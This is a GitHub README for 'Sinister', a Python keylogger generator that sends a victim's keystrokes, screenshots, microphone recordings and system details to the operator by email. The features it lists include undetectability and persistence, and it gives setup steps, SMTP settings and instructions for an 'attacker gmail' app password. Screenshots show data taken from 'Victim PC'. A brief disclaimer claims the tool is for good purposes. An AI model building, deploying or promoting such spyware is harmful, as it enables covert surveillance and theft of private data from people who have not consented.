<h1 align="center">Sinister</h1>
  
  ![what-is-a-keylogger](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/808237bd-ac92-4f39-bab2-96a2b096d0b1)


                                        This small python script can do really awesome work.
  
</center>

             
Sinister is Keylogger Generator for Windows/Linux, which sends key-logs & screenshot via email with other juicy target info written in Python 3.

## Disclaimer
<p align="center">
  :computer: This project was created only for good purposes and personal use.
</p>

THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.

## Features
- [x] Works on Windows/Linux
- [x] Notify New Victim Via Email
- [x] Undetectable
- [x] Persistence
- [x] Email Credentials Validation before Payload Generation.
- [x] Can receive Keylogs in any email provider such as GMAIL, YAHOO, OUTLOOK, Custom SMTP.

* SMTP Server/ Port

| Server Name | SMTP Server | SMTP Port |
| ----------- | ----------- | --------- |
| GMAIL       | smtp.gmail.com | 587 |
| OUTLOOK     | smtp-mail.outlook.com | 587 |
| YAHOO       | smtp.mail.yahoo.com | 587 |

- [x] Sends Screenshot of Victim PC's Screen via email

- [x] Grabs & Send Useful Information of Victim's Device

| These Things are Grabbed & Sended: |
| -----------------------------------|
| Operating System |
| Computer Name    |
| User Name |
| Public IPv4 |

- [x] If your payload is unable to execute, then specify --debug to run exe on foreground with CMD

## Important
On **30 May 2022**, Google has **removed less secure apps feature**, so instead of Gmail Password:
- Enable 2FA on your attacker gmail
- Create App Specific Password
- Use that `app specific password`, while creating payload. 
- How to Create App Specific Password: [Click Here](https://support.google.com/mail/answer/185833?hl=en)
- For Creating An App Password In Gmail: [Click Here](https://myaccount.google.com/apppasswords?pli=1&rapt=AEjHL4NNBJ_HvRa3vH__Xiq87r0WIimG0hLnr2Xdf64oikZKdAh7a9POETWXYTpXWiASFwbrjItChNnCKq4Hi7oim3AMgPdQmDQauMmpgm2j01rPmBEm4sI)


## Tested On
[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 8.1 - Pro**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 7 - Ultimate**

## Prerequisite
- [x] Python 3.X
- [x] Few External Modules

## How To Use in Windows
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/Er-Parag-Cyber/snister.git

# Go into the repository
$ cd sinister

# Installing dependencies
$ python -m pip install -r windows_packages.txt

# Open snister.py in Text editor and Configure Line 16 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe"
# Run Silently Snister
$
```
## Screenshots:

#### Getting report
![Screenshot (86)](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/7b2fed35-4cd4-4f84-a521-20c7d4b8d3c8)


#### Victim Photo Mail
![Victim Photo Mail](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/b4482764-f7d6-4fbe-a5bd-6449ccf025b1)


#### Screenshots Mail
![SS Mail](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/8ac6ab9f-e13e-4351-a733-b7dfedbf4625)


#### Mic Recording From Victim PC
![Mic Recording](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/0e546132-f06a-4680-904b-33b7aad56212)


#### Logs Output From Victim PC
![Log Folders](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/aaa5268f-78e9-4261-a8eb-575650509131)
![Logs Output](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/51fab0ec-6d18-43a7-8f05-bf665877e294)


#### Net Information XML From Victim PC
![IMG_20240506_200718](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/5fd594ee-11aa-4600-8b9a-bbe2d74d76d2)


#### Screenshots From Victim PC
![SS](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/7279f268-7dc4-48c3-a803-64ed1e5ae2fb)







